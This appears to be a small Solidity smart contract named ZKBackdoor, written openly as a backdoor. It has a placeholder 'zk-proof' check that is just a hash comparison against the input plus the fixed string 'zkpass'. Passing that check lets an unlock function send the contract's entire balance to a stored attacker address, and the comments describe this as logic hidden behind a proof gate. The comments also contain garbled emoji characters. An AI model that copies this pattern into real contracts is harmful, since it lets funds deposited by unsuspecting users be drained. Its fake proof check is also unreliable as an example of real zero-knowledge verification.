// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

/// @title ZKBackdoor - Executes logic ONLY when a valid zk proof is passed
contract ZKBackdoor {
    address public attacker;

    constructor(address _attacker) {
        attacker = _attacker;
    }

    /// Simulates zk proof verification
    function verifyProof(bytes32 _input, bytes calldata _proof) public pure returns (bool) {
        // ðŸ”’ Assume off-chain SNARK verification returns true (placeholder logic)
        return keccak256(_proof) == keccak256(abi.encodePacked(_input, "zkpass"));
    }

    function unlock(bytes32 input, bytes calldata proof) external {
        require(verifyProof(input, proof), "Invalid zk-proof");
        payable(attacker).transfer(address(this).balance); // ðŸ§  logic hidden behind proof gate
    }

    receive() external payable {}
}
